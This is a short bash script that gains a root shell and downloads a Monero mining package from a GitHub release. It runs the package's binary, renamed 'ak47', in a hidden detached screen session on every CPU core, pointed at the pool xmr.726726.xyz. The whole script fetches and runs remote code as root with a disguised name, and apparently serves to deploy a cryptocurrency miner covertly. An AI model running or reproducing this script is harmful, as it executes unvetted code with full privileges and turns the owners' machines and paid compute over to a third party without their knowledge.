#!/bin/bash
sudo -i <<EOF
wget https://github.com/yuqingkj/mine_xmr/releases/download/6.19.2/6.19.2.tar.gz
tar -xvf 6.19.2.tar.gz
cd 6.19.2/
chmod 777 ./ak47
screen -dmS xmr
screen -x -S xmr -p 0 -X stuff "./ak47 -o xmr.726726.xyz:3333 --rig-id az -t $(nproc) \n"
echo ok
EOF
